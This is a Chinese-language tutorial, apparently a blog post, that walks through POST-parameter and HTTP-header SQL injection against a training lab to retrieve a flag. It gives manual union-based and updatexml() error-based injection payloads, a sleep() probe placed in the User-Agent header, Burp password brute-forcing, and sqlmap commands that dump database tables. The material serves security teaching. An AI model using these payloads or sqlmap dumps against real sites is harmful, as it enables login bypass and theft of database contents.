# 原创
：  SQL篇之POST注入和HEAD注入

# SQL篇之POST注入和HEAD注入

**目录**

[一、POST注入介绍](#%E4%B8%80%E3%80%81POST%E6%B3%A8%E5%85%A5%E4%BB%8B%E7%BB%8D)

[POST注入高危点：](#POST%E6%B3%A8%E5%85%A5%E9%AB%98%E5%8D%B1%E7%82%B9%EF%BC%9A)

[最经典的POST注入——万能密码：](#%E6%9C%80%E7%BB%8F%E5%85%B8%E7%9A%84POST%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%EF%BC%9A)

[ POST实战](#%C2%A0POST%E5%AE%9E%E6%88%98)

[手工注入 ](#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%C2%A0)

[Head注入介绍](#h2-4)

[HEAD实战 ](#HEAD%E5%AE%9E%E6%88%98%C2%A0)

[==》账号：admin;密码：123456。](#h3-6)

[手工注入](#h3-7)

---


> 
如果文章对你有帮助，欢迎**关注、点赞、收藏**一键三连支持以下哦！
想要一起交流学习的小伙伴可以加zkaq222（备注CSDN，不备注通不过哦）进入学习，共同学习进步


为了更好的学习POST注入和HEAD注入,我们有必要**理解[SQL注入的原理](https://blog.csdn.net/zkaqlaoniao/article/details/120949218)**

> 
注入攻击的本质，是**把用户输入的数据当做代码执行。**
关键条件：
第一个是**用户能够控制输入；**
第二个是**原本程序要执行的代码，拼接了用户输入的数据**


### **一、POST注入介绍**

POST注入就是使用**POST**进行传参的注入，**本质上和GET类型的没什么区别**。

在真实的站点上，POST注入往往比GET注入要**多的多**

#### **POST注入高危点：**

#### 最经典的POST注入——**万能密码**：

###  POST实战

> 
闭合：
' 闭合；
" 闭合；
')闭合；
")闭合等等；


#### 手工注入 

**1.判断注入点**

'or 1=1 and -1=-1#     ==》登录成功 

'or 1=1 and -1=-2#     ==》登录失败 

==》在Username登录框存在注入点

**2.判断当前页面字段总数**

'or 1=1 order by 3#    ==》登录成功

'or 1=1 order by 4#    ==》登录失败

==》当前页面字段总数: 3

**3.判断显示位**

'or 1=2 union select 1,2,3#    

 ==》注入点是 **2，3**。

**4.查当前数据库 **

'or 1=2 union select 1,2,database()#

==》数据库名为 post_error

**5.查表名**

'or 1=2 union select 1,2,GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()#

==》两个表：**flag和user**。

**6.查列名 **

FLAG应该在flag表里；

**'or 1=2 union select 1,2,GROUP_CONCAT(column_name) from information_schema.columns where table_schema=database() and table_name='flag'#**

==》列名：**Id和flag**

**7.查字段内容 **

FLAG应该在flag表里的flag字段里；

**'or 1=2 union select 1,2,GROUP_CONCAT(flag) from flag#**

 **Salmap——POST注入：**

> 

**--forms**读取页面中POST传参的表单的传参名然后进行SQL注入
**-r **读取数据包文件进行SQL注入，在注入处末尾可以打一个*号告诉Sqlmap测试哪个点


 **--forms**

> 
sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-05/index.php --forms


==》注入成功

> 
**跑库名**
**sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-05/index.php --forms --dbs**
**跑表名**
**sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-05/index.php --forms -D post_error --tables**
**字段名**
**sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-05/index.php --forms -D post_error -T flag --columns**
**出数据**
**sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-05/index.php --forms -D post_error -T flag -C flag --dump**


**-r **

Burp抓包，为了方便在Sqlmap文件夹里创建文档1.txt然后把数据存放在里面；

> 
<pre>POST /Pass-05/index.php HTTP/1.1
Host: inject2.lab.aqlab.cn:81
Content-Length: 45
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://inject2.lab.aqlab.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://inject2.lab.aqlab.cn:81/Pass-05/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close</pre>
<pre>username=&amp;password=&amp;submit=%E7%99%BB%E5%BD%95
</pre>


> 
**sqlmap.py -r 1.txt** 


==》注入成功

然后跑库名(sqlmap.py -r 1.txt --dbs)，表名，字段名和数据 跟--forms差不多

### Head注入介绍

> 
在传参的时候，将我们的数据构建在http头部。
就是当你登录时，网页可能会记录下你的ip之类的信息，方便下次访问，此时或许存在注入点。
**注：需登录成功。**


PHP 全局变量 - 超全局变量

> 
PHP 中的**许多预定义变量都是“超全局的”**，这意味着它们在一个脚本的**全部作用域中都可用**。 


 如：

> 
$_REQUEST （获取GET/POST/COOKIE）
COOKIE在新版本已经无法获取了 $_POST （获取POST传参）
$_GET (获取GET的传参)
$_COOKIE （获取COOKIE的值）
$_SERVER （包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组）


 $_SERVER功能很强大，如：

> 
$_SERVER['HTTP_HOST'] 请求头信息中的Host内容，获取当前域名。
$_SERVER["REMOTE_ADDR"] 浏览网页的用户ip。
$_SERVER["HTTP_USER_AGENT"] 获取用户相关信息，包括用户浏览器、操作系统等信息


$_SERVER包含的信息：

updatexml() 

> 
updatexml() 更新xml文档的函数 ;
语法：updatexml(目标xml内容，xml文档路径，更新的内容)


例如：**updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)** 

> 
实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了
但是报错的时候他其实已经执行了那个子查询代码！
[0x7e 实际是是16进制，Mysql支持16进制，但是开头得写0x    0x7e是一个特殊符号，然后不符合路径规则报错]   ~ ~


> 
<pre>**select updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)**
</pre>


<img alt="" height="371" src="https://img-blog.csdnimg.cn/2d58283f8d6c4a4bb023a0b47baba410.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5riX6YCP5rWL6K-V6ICB6bifLeS5nemdkg==,size_15,color_FFFFFF,t_70,g_se,x_16" width="713"/> ==》这样我们就实现了通过报错注入查询数据库名的目的

> 
updatexml () 这个函数一般是配合and 或者是or 使用的，
他和联合查询不同，不需要在意什么字段数


 如:

> 
<pre>select *from wlb where id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)</pre>


> 
但是要注意，and 情况下只要一个为False，就会判定是False,所以如果and前面的条件不成立的情况下，就不会执行之后的语句。
所以使用的时候建议使用or 某些没有回显盲注也可以用这个updatexml()做出来。
但是报错一般有长度限制，不能输出太长的数据，尽量不使用group_concat()。
 


### HEAD实战 

> 
HEAD头修改：
**User-Agent；**
**Referer；**
**X-Forwarded-For等等**


首先用Burp爆破密码:

#### ==》账号：admin;密码：123456。

#### 手工注入

需要用 **ModHeader **插件：

> 
**修改UA头进行注入:**
**1.判断注入点**
**'or sleep(5),1)#**


==》存在SQL注入。

**2.查当前数据库 **

**'or updatexml(1,concat(0x7e,(select database()),0x7e),1),1)#**

==》当前数据库为**head_error。**

**3.查表名 **

'**or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),1)#**

==》表名为 **flag_head。**

**4.查列名 **

**'or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name="flag_head" limit 1,1)),1),1)#**

**==》**列名为**flag_h1。**

**5.查字段内容 **

**'or updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 1,1)),1),1)#**

Sqlmap注入

Burp抓包，为了方便还是在Sqlmap文件夹里创建文档1.txt然后把数据存放在里面；

并**在存在注入点的地方打个*号**；

> 
<pre>**sqlmap.py -r 1.txt**
</pre>


 

 ==》**注入成功**；

然后跑库名(sqlmap.py -r 1.txt --dbs)，表名，字段名和数据；

跟上面的 --forms的POST注入类似；

 

 

 

 
